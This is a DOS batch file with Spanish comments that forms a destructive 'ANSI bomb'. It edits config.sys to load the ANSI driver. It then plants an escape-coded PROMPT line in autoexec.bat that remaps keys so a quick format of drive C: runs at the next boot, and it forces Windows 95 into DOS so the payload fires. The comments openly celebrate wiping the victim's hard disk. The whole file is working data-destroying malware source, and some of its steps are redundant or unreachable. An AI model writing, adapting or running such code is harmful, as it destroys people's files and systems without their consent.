   @echo off
   :: Para que funcione debe de cargarse el controlador ANSI, para ello
   :: vamos a introducirlo en el config.sys para que se cargue la proxima
   :: vez que se inicie.
   copy c:\config.sys c:\temp.sys
   deltree /y c:\config.sys
   ren c:\temp.sys config.sys
   :: En caso de ke el config.sys este protegido contra escritura
   if exist C:\dos\ansi.sys goto DOS
   goto Winblows
   :DOS
   echo DEVICE=C:\DOS\ANSI.SYS >> c:\config.sys
   goto auto
   :: Si la persona esta corriendo DOS entonces a¤ade esa linea para cargar
   :: el controlador ANSI la proxima vez que inicie.
   if exist C:\windows\command goto Winblows
   :WINBLOWS
   echo DEVICE=C:\WINDOWS\COMMAND\ANSI.SYS >> c:\config.sys
   :: Esta linea se a¤ade al config.sys si esta utilizando Windows.

   :: Ahora la parte importante
   :: Vamos a meter unas cuantas lineas al autoexec.bat
   :: para que la proxima vez que inicie BOOM =)

   :AUTO
   echo prompt $e[0;30m >> c:\autoexec.bat
   :: La pantalla se volvera negra.
   echo prompt $e[13;0;80;99;58;13;99;100;92;13;102;111;114;109;97;116;32;99;58;32;47;113;32;"/t:20 /n:50";13;121;13; >> c:\autoexec.bat
   :: Formatea rapidamenta su disco duro, aprox. 20-30 segundos
   :: Hace un Formateo a bajo nivel, jode el disco duro =)
   echo prompt [0m >> c:\autoexec.bat
   echo prompt $p$g >> c:\autoexec.bat
   :: Regresa la pantalla a la normalidad.
   if exist c:\windows\command goto COMMAND
   goto END
   :COMMAND
   echo c:\command.com >> c:\autoexec.bat
   :: En caso de que tenga Win95, comenzara en DOS...
   :: y asi la bomba se ejecuta y vale madres...
   :END
